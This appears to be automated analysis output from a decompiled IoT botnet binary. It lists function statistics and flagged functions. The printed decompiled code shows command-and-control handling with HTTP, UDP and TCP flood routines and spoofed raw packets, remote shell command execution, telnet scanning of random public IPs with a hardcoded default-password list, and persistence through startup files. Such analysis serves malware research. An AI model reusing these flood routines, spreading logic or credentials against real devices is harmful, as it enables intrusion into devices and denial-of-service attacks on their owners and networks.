----------------------------------------------------------------------------------------------
feof                                              |1   |411     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |401     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |394     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |406     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |396     |0             |0           |
----------------------------------------------------------------------------------------------
__uClibc_init                                     |0   |415     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |448     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |1   |402     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |406     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |394     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |424     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |406     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |410     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |411     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |404     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |418     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |869     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |423     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |405     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |437     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |407     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |4   |406     |0             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |509     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |404     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |424     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |485     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |1   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |1   |464     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |399     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |429     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |407     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
bzero                                             |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |0   |403     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |396     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |3   |399     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |4   |405     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |552     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |404     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |396     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |395     |0             |0           |
----------------------------------------------------------------------------------------------
exit                                              |1   |414     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |409     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |3   |407     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |399     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |2   |411     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |407     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |410     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |395     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 22895
++++++++ FUNCTION END 26515
++++++++ FUNCTION LENGTH 3620
    if (__GI_strcoll(*a2, (int32_t)"PING") == 0) {
        Rootsprintf(*(int32_t *)&v390, (int32_t)"PONG!");
            kill();
            Rootsprintf(*(int32_t *)&v390, (int32_t)"REP STOPPING!");
                int32_t v464 = __libc_fork(); // 0x407c74
                int32_t result2 = listFork(); // 0x407dc4
                Rootsprintf(v449, (int32_t)"HTTP %s Flooding %s:%d for %d seconds");
                sendHTTP(*v407, v402, (int16_t)(v424 % 0x10000), v425, v426, v428);
                if (__GI_strcoll(*a2, (int32_t)"UDP") == 0) {
                                                                result3 = listFork();
                                                                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                            while (true) {
                                                                if (listFork() == 0) {
                                                                    sendUDP(v466, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                            result3 = listFork();
                                                            sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                    result3 = listFork();
                                                    sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                while (true) {
                                    if (listFork() != 0) {
                                    sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                            result3 = listFork();
                            sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                        while (true) {
                            if (listFork() != 0) {
                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                    result3 = listFork();
                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                if (__GI_strcoll(*a2, (int32_t)"TCP") == 0) {
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                            if (listFork() == 0) {
                                                sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendSTD(v460, v446, v447);
                                                            result4 = listFork();
                                                            sendSTD(v445, v446, v447);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendSTD(v460, v446, v447);
                                                result4 = listFork();
                                                    sendSTD(v445, v446, v447);
                                                    while (true) {
                                            if (listFork() == 0) {
                                                sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendSTD(v460, v446, v447);
                                                            result4 = listFork();
                                                            sendSTD(v445, v446, v447);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendSTD(v460, v446, v447);
                                                result4 = listFork();
                                                    sendSTD(v445, v446, v447);
                                                    while (true) {
                                        while (true) {
                                            if (listFork() == 0) {
                                                sendTCP(v467, v404, v440, v441, v442, 0, 10);
                                        if (listFork() == 0) {
                                            sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                            result4 = listFork();
                                                            sendSTD(v445, v446, v447);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendSTD(v468, v446, v447);
                                                        result4 = listFork();
                                                        sendSTD(v445, v446, v447);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendSTD(v460, v446, v447);
                                            result4 = listFork();
                                                sendSTD(v445, v446, v447);
                                                while (true) {
                                                            kill();
                        while (true) {
                            if (listFork() != 0) {
                            sendTCP(v458, v404, v440, v441, v442, 0, 10);
                    if (listFork() == 0) {
                        sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                    while (true) {
                                        if (listFork() != 0) {
                                        sendSTD(v460, v446, v447);
                                result4 = listFork();
                                sendSTD(v445, v446, v447);
                        while (true) {
                            if (listFork() != 0) {
                            sendSTD(v460, v446, v447);
                    result4 = listFork();
                        sendSTD(v445, v446, v447);
                        while (true) {
            if (__GI_strcoll(*a2, (int32_t)"UDP") == 0) {
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                        result3 = listFork();
                                                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                result3 = listFork();
                                                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                            while (true) {
                                if (listFork() != 0) {
                                sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                        result3 = listFork();
                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                    while (true) {
                        if (listFork() != 0) {
                        sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                if (listFork() == 0) {
                    sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                if (__GI_strcoll(*a2, (int32_t)"TCP") == 0) {
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                            if (listFork() == 0) {
                                                sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendSTD(v460, v446, v447);
                                                            result4 = listFork();
                                                            sendSTD(v445, v446, v447);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendSTD(v460, v446, v447);
                                                result4 = listFork();
                                                    sendSTD(v445, v446, v447);
                                                    while (true) {
                                            while (true) {
                                                if (listFork() != 0) {
                                                sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                        if (listFork() == 0) {
                                            sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendSTD(v460, v446, v447);
                                                        if (listFork() == 0) {
                                                            sendSTD(v445, v446, v447);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendSTD(v460, v446, v447);
                                            if (listFork() == 0) {
                                                sendSTD(v445, v446, v447);
                                                while (true) {
                        while (true) {
                            if (listFork() != 0) {
                            sendTCP(v458, v404, v440, v441, v442, 0, 10);
                    if (listFork() == 0) {
                        sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                    while (true) {
                                        if (listFork() != 0) {
                                        sendSTD(v460, v446, v447);
                                if (listFork() == 0) {
                                    sendSTD(v445, v446, v447);
                        while (true) {
                            if (listFork() != 0) {
                            sendSTD(v460, v446, v447);
                    if (listFork() == 0) {
                        sendSTD(v445, v446, v447);
                        while (true) {
            if (listFork() == 0) {
                Rootsprintf(v449, (int32_t)"HTTP %s Flooding %s:%d for %d seconds");
                sendHTTP(*v407, v402, (int16_t)(v424 % 0x10000), v425, v426, v428);
                if (__GI_strcoll(*a2, (int32_t)"UDP") == 0) {
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                            if (listFork() == 0) {
                                                                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                    if (listFork() == 0) {
                                                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                while (true) {
                                    if (listFork() != 0) {
                                    sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                            if (listFork() == 0) {
                                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                        while (true) {
                            if (listFork() != 0) {
                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                    if (listFork() == 0) {
                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                    if (__GI_strcoll(*a2, (int32_t)"TCP") == 0) {
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                                if (listFork() == 0) {
                                                    sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendSTD(v460, v446, v447);
                                                                if (listFork() == 0) {
                                                                    sendSTD(v445, v446, v447);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendSTD(v460, v446, v447);
                                                    if (listFork() == 0) {
                                                        sendSTD(v445, v446, v447);
                                                        while (true) {
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                            if (listFork() == 0) {
                                                sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendSTD(v460, v446, v447);
                                                            if (listFork() == 0) {
                                                                sendSTD(v445, v446, v447);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendSTD(v460, v446, v447);
                                                if (listFork() == 0) {
                                                    sendSTD(v445, v446, v447);
                                                    while (true) {
                            while (true) {
                                if (listFork() != 0) {
                                sendTCP(v458, v404, v440, v441, v442, 0, 10);
                        if (listFork() == 0) {
                            sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                        while (true) {
                                            if (listFork() != 0) {
                                            sendSTD(v460, v446, v447);
                                    if (listFork() == 0) {
                                        sendSTD(v445, v446, v447);
                            while (true) {
                                if (listFork() != 0) {
                                sendSTD(v460, v446, v447);
                        if (listFork() == 0) {
                            sendSTD(v445, v446, v447);
                            while (true) {
        if (__GI_strcoll(*a2, (int32_t)"UDP") == 0) {
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                    if (listFork() == 0) {
                                                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                                            if (listFork() == 0) {
                                                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                        while (true) {
                            if (listFork() != 0) {
                            sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
                    if (listFork() == 0) {
                        sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
                while (true) {
                    if (listFork() != 0) {
                    sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
            if (listFork() == 0) {
                sendUDP(v430, v403, v432, v433, v434, 1000, 0xf4240, 0);
            if (__GI_strcoll(*a2, (int32_t)"TCP") == 0) {
                                            while (true) {
                                                if (listFork() != 0) {
                                                sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                        if (listFork() == 0) {
                                            sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendSTD(v460, v446, v447);
                                                        if (listFork() == 0) {
                                                            sendSTD(v445, v446, v447);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendSTD(v460, v446, v447);
                                            if (listFork() == 0) {
                                                sendSTD(v445, v446, v447);
                                                while (true) {
                                        while (true) {
                                            if (listFork() != 0) {
                                            sendTCP(v458, v404, v440, v441, v442, 0, 10);
                                    if (listFork() == 0) {
                                        sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendSTD(v460, v446, v447);
                                                    if (listFork() == 0) {
                                                        sendSTD(v445, v446, v447);
                                            while (true) {
                                                if (listFork() != 0) {
                                                sendSTD(v460, v446, v447);
                                        if (listFork() == 0) {
                                            sendSTD(v445, v446, v447);
                                            while (true) {
                    while (true) {
                        if (listFork() != 0) {
                        sendTCP(v458, v404, v440, v441, v442, 0, 10);
                if (listFork() == 0) {
                    sendTCP(v439, v404, v440, v441, v442, 0, 10);
                                while (true) {
                                    if (listFork() != 0) {
                                    sendSTD(v460, v446, v447);
                    while (true) {
=================FUNCTION : main ===================
++++++++ FUNCTION START 27800
++++++++ FUNCTION END 28777
++++++++ FUNCTION LENGTH 977
    int32_t v386 = v385 ^ __libc_getpid(); // 0x409688
    srand(v386);
    int32_t v388 = v387 ^ __libc_getpid(); // 0x4096d4
    init_rand(v388);
    int32_t v389 = fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x40971c
        v403 = fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
            v398 = __libc_fork();
                if (__libc_fork() == 0) {
                    zprintf((int32_t)"fork failed\n");
                while (true) {
                    if (initConnection() != 0) {
                    __GI_inet_ntoa(*(int32_t *)&v404);
                    getBuild();
                    Rootsprintf(*(int32_t *)&v406, (int32_t)&v405);
                    while (true) {
                        while (true) {
                                while (true) {
                                if (strstr(v399, "PING") == v399) {
                                    Rootsprintf(*(int32_t *)&v406, (int32_t)"PONG");
                                if (strstr(v399, "LELIMDUP") == v399) {
                                    zprintf((int32_t)"PEACE OUT IMMA DUP\n");
                                    while (true) {
                                            while (true) {
                                    while (true) {
                                            if (listFork() == 0) {
                                                szprintf(v400, (int32_t)"%s 2>&1", v430);
                                                fdpopen(v400, "r");
                                                Rootsprintf(*(int32_t *)&v406, (int32_t)"%s");
                                                while (fdgets(v400, 1024, v400) != 0) {
                                                    Rootsprintf(*(int32_t *)&v406, (int32_t)"%s");
                                                fdpclose(v400);
                                                while (true) {
                                                processCmd(v435, &v394);
                                                    free();
                                                        free();
                __libc_waitpid(v398, (int32_t)&v395, 0);
            while (true) {
                if (initConnection() == 0) {
    getcwd(v445, 256);
        fclose((int16_t *)v403);
        sprintf(v449, (int32_t)"\"%s%s\"\n", v445, *(int32_t *)argv + v447, v447);
        while (true) {
            fgets((int32_t)&v393, 1024, v403);
            int32_t v453 = strcasecmp((char *)&v393, v449); // 0x4098d0
            fclose(v450);
            int32_t v455 = fopen((int32_t)v397, (int32_t)&v454); // 0x409954
                fclose((int16_t *)v455);
                fclose(v450);
                fclose(v450);
            fclose(v450);
            fclose(v450);
        v398 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v398, (int32_t)&v395, 0);
        while (true) {
            if (initConnection() == 0) {
    v398 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v398, (int32_t)&v395, 0);
    while (true) {
        if (initConnection() == 0) {
    while (true) {
    free();
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 72023
++++++++ FUNCTION END 72890
++++++++ FUNCTION LENGTH 867
    int32_t v390 = __get_hosts_byname_r(a1, 2, v389, a3, a4, a5, a6); // 0x40e5e4
                    if (inet_aton((char *)a1) != 0) {
                    __open_nameservers();
                    v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                        free();
                        free();
                    free();
                        free();
                    free();
                if (inet_aton((char *)a1) != 0) {
                __open_nameservers();
                v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                    free();
                    free();
                free();
                    free();
                free();
                        if (inet_aton((char *)a1) != 0) {
                        __open_nameservers();
                        v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                            free();
                            free();
                        free();
                            free();
                        free();
                            if (inet_aton((char *)a1) != 0) {
                            __open_nameservers();
                            v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                                free();
                                free();
                            free();
                                free();
                            free();
                            if (inet_aton((char *)a1) != 0) {
                            __open_nameservers();
                            v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                                free();
                                free();
                            free();
                                free();
                            free();
                                if (inet_aton((char *)a1) != 0) {
                                __open_nameservers();
                                v413 = __dns_lookup((char *)a1, 1, v409, v410, (int32_t)&v396, v407);
                                    free();
                                    free();
                                free();
                                    free();
                                free();
=================FUNCTION : _init ===================
++++++++ FUNCTION START 308
++++++++ FUNCTION END 1456
++++++++ FUNCTION LENGTH 1148
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "telnet",
        "telnet",
        "NetICs",
        "netadmin",
        "attack",
        "attack",
        "system",
        "NETWORK",
        "4getme2",
        "extendnet",
        "Posterie",
        "NetVCR",
        "telnet",
        "system",
        "openlgtv",
        "netgear",
        "synnet",
        "netopia",
        "synnet",
        "telnet",
        "telnet",
        "NetICs",
        "netadmin",
        "attack",
        "attack",
        "system",
        "NETWORK",
        "4getme2",
        "extendnet",
        "Posterie",
        "NetVCR",
        "telnet",
        "system",
        "openlgtv",
        "netgear",
        "synnet",
        "netopia",
        "synnet",
        "telnet",
        "/dev/netslink/",
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 45501
++++++++ FUNCTION END 54049
++++++++ FUNCTION LENGTH 8548
        while (true) {
                case 37: {
                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                        while (true) {
                                                    while (true) {
                                                        while (true) {
                                                    while (true) {
                                                        while (true) {
                                                    while (true) {
                                                        while (true) {
                                                    while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                    while (true) {
                case 0: {
                            while (true) {
    while (true) {
            case 37: {
                        while (true) {
            case 0: {
                        while (true) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 107021
++++++++ FUNCTION END 107932
++++++++ FUNCTION LENGTH 911
            __libc_close(v390);
        free();
        free();
        while (true) {
                    if (inet_pton(10, (char *)v415, (int32_t)&v414) < 1) {
                    inet_addr(v415);
                    int32_t v416 = socket(); // 0x412e08
                    if (__libc_connect(v416, (struct sockaddr *)28, 28) > -1) {
                        __libc_send(v416, (int32_t *)v383, 0, 0);
                            int32_t v422 = __libc_recv(v416, (int32_t *)v383, 512, 0); // 0x412edc
                                            case 3: {
                                            case 0: {
                                                while (true) {
                                                while (true) {
                                                                            free();
                                                                            free();
                                                                        free();
                                                                            free();
                                                                            case 28: {
                                                                            case 1: {
                                                    __libc_close(v390);
                                                free();
                                                free();
                __libc_close(v390);
            free();
            free();
        __libc_close(v390);
    free();
    free();
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 7130
++++++++ FUNCTION END 7746
++++++++ FUNCTION LENGTH 616
            v394 = 4 * getdtablesize();
        v395 = __vfork();
            __libc_close(v392);
            __libc_close(v393);
                    __libc_close(v393);
                __libc_close(v392);
            __libc_close(v392);
            __libc_close(v393);
                __libc_close(v393);
            __libc_close(v392);
            v394 = 4 * getdtablesize();
        v395 = __vfork();
            __libc_close(v392);
            __libc_close(v393);
                __libc_close(v392);
                __libc_close(v393);
                __libc_close(v393);
            __libc_close(v392);
        v394 = 4 * getdtablesize();
    v395 = __vfork();
        __libc_close(v392);
        __libc_close(v393);
            __libc_close(v392);
            __libc_close(v393);
            __libc_close(v393);
        __libc_close(v392);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 21837
++++++++ FUNCTION END 22367
++++++++ FUNCTION LENGTH 530
        rand_cmwc();
    int32_t v396 = getHost(a1, &v395); // 0x40673c
            int32_t v399 = socket(); // 0x4067a8
                Rootsprintf(*(int32_t *)&v398, (int32_t)"Failed opening raw socket.");
            makeRandomStr(v401, a5);
            __libc_sendto(v399, v402, a5, 0, (int32_t)&v393, 16);
                    rand_cmwc();
        if (__GI_setsockopt(v392, 0, 3, &v406, 4) <= 0xffffffff) {
            Rootsprintf(*(int32_t *)&v398, (int32_t)"Failed setting raw headers mode.");
            int32_t v409 = v407 ^ rand_cmwc(); // 0x406b28
            srand(v409);
            init_rand(rand());
        int32_t v414 = GetRandomIP(v410); // 0x406c54
        *v413 = (int16_t)rand_cmwc();
            rand_cmwc();
        makeRandomStr(v412 + 28, a5);
        __libc_sendto(v392, (int32_t *)v412, a5 + 28, 0, v421, (int32_t)&v422);
        *v413 = (int16_t)rand_cmwc();
            rand_cmwc();
        rand_cmwc();
        htonl(GetRandomIP(v410));
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 22370
++++++++ FUNCTION END 22892
++++++++ FUNCTION LENGTH 522
        rand_cmwc();
    getHost(a1, &v391);
    socket();
    if (__GI_setsockopt(v393, 0, 3, &v394, 4) <= 0xffffffff) {
        Rootsprintf(*(int32_t *)&v395, (int32_t)"Failed setting raw headers mode.");
    int32_t v401 = GetRandomIP(v396); // 0x407348
    *v400 = (int16_t)rand_cmwc();
    int32_t v402 = rand_cmwc(); // 0x4073d4
    while (true) {
        if (__GI_strcoll(v407, (int32_t)"rst") == 0) {
        if (__GI_strcoll(v407, (int32_t)"psh") == 0) {
        Rootsprintf(*(int32_t *)&v395, (int32_t)"Invalid flag \"%s\"");
    rand_cmwc();
        rand_cmwc();
    *v409 = (int16_t)tcpcsum(v398, v399);
    __libc_sendto(v393, (int32_t *)v398, a6 + 40, 0, v414, (int32_t)&v415);
    htonl(GetRandomIP(v396));
    rand_cmwc();
    *v403 = rand_cmwc();
    *v400 = (int16_t)rand_cmwc();
    *v409 = (int16_t)tcpcsum(v398, v399);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 20333
++++++++ FUNCTION END 20987
++++++++ FUNCTION LENGTH 654
    int32_t v391 = v390 ^ rand_cmwc(); // 0x404a14
    srand(v391);
    while (true) {
                GetRandomPublicIP(v395);
            socket();
                if (__libc_connect(*v416, (struct sockaddr *)&v392, 16) == -1) {
                while (true) {
                                if (__libc_send(*v416, (int32_t *)v424, v423, 0x4000) <= 0xffffffff) {
                                if (__libc_send(*v416, (int32_t *)"\r\n", 2, 0x4000) <= 0xffffffff) {
                                    if (__libc_send(*v416, (int32_t *)v426, v425, 0x4000) <= 0xffffffff) {
                                    if (__libc_send(*v416, (int32_t *)"\r\n", 2, 0x4000) <= 0xffffffff) {
                                            get_telstate_host(v404);
                                            Rootsprintf(*(int32_t *)&v428, (int32_t)&v427);
                                        __libc_send(*v416, (int32_t *)"sh\r\n", 4, 0x4000);
                                        __libc_send(*v416, (int32_t *)"shell\r\n", 7, 0x4000);
                                        if (__libc_send(*v416, (int32_t *)v430, v429, 0x4000) <= 0xffffffff) {
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 7749
++++++++ FUNCTION END 8232
++++++++ FUNCTION LENGTH 483
            __libc_close(a1);
            sigprocmask();
            while (true) {
                int32_t v397 = __libc_waitpid(v395, (int32_t)&v393, 0); // 0x401b50
                sigprocmask();
        __libc_close(a1);
        sigprocmask();
        while (true) {
            if (__libc_waitpid(v395, (int32_t)&v393, 0) == -1) {
            sigprocmask();
    __libc_close(a1);
    sigprocmask();
    while (true) {
        if (__libc_waitpid(v395, (int32_t)&v393, 0) == -1) {
        sigprocmask();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 101567
++++++++ FUNCTION END 102982
++++++++ FUNCTION LENGTH 1415
    while (true) {
    while (true) {
        while (true) {
                    while (true) {
                        while (true) {
                                            while (true) {
                                                while (true) {
                                        while (true) {
                                while (true) {
                                        while (true) {
                            while (true) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 17234
++++++++ FUNCTION END 17885
++++++++ FUNCTION LENGTH 651
    rand();
    rand();
    rand();
    rand();
    while (true) {
        rand();
        rand();
        rand();
        rand();
    szprintf(v400, (int32_t)"%d.%d.%d.%d", (int32_t)*v391);
    return inet_addr(v400);
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 26952
++++++++ FUNCTION END 27400
++++++++ FUNCTION LENGTH 448
    int32_t v392 = socket(); // 0x4091e4
    inet_addr((int32_t)"8.8.8.8");
    __libc_connect(v392, (struct sockaddr *)&v393, 16);
    __GI_getsockname(v392, (struct sockaddr *)&v395, (int32_t)&v394);
    int32_t v396 = __libc_open("/proc/net/route", 0); // 0x409338
    while (true) {
        if (strstr(v398, "\t00000000\t") != 0) {
